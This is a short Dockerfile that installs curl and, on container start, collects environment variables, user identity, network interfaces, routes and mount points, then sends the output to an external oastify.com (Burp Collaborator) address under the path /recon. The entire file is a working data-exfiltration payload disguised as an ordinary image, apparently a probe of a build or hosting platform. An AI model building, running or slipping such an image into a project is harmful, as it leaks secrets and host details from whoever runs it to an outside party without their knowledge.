FROM alpine
RUN apk add --no-cache curl


CMD C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
    (echo " ENV" && env && \
     echo " WHOAMI" && whoami && id && \
     echo " IFCONFIG" && ifconfig && \
     echo " ROUTE " && route -n && \
     echo "MOUNTS" && mount) 2>&1 | curl -s "$C/recon" --data-binary @-

